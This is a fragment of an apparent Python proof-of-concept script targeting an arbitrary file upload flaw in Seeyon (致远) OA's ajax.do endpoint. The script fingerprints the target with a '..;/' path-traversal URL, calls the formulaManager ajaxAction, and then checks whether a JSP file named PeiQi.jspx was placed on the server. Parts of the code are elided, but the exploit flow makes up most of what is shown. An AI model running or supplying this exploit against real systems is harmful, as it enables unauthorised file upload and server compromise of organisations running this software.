...
def poc(target):
    ...
    finger_url = urllib.parse.urljoin(target, "/seeyon/thirdpartyController.do.css/..;/ajax.do")
    vurl = urllib.parse.urljoin(target,"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip")
    ...
    verify_url = urllib.parse.urljoin(target, "/seeyon/PeiQi.jspx")
    try:
        ...
        if finger_rep.status_code == 200 and re.search("java.lang.NullPointerException:null", finger_rep.text):
            ...
            if rep.status_code == 500 and json.loads(rep.text).get("code"):
                rep2 = requests.get(verify_url, timeout=timeout, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},verify=False)
...
def main():
    parser = argparse.ArgumentParser("致远OA ajax.do 任意文件上传漏洞检测POC")
